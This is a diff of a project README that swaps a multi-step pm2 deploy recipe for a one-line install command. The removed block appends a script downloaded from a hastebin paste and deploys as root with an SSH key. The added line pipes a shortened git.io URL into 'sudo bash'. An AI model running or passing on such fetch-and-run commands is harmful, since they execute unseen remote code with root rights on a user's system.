@@ -12,28 +12,8 @@
 - [Python 3](https://www.python.org/downloads/) (3.2+ recommended)
 
 ## Deploy to Linux server
-```sh
-# Install pm2 process manager
-npm install --global pm2
 
-# Create deploy.json containing production server information
-cat <<EOT >> deploy.json
-{
-  "user": "root",
-  "host": "127.0.0.1",
-  "key": "~/.ssh/id_rsa"
-}
-EOT
-
-# Save deployment script
-curl https://hastebin.com/raw/ujiyelogec >> ecosystem.config.js
-
-# Setup prerequisites
-pm2 deploy ecosystem.config.js production setup
-
-# Deploy!
-pm2 deploy ecosystem.config.js production --force
-```
+`curl -sL https://git.io/JUjsg | sudo bash -s`
 
 ## Install
 
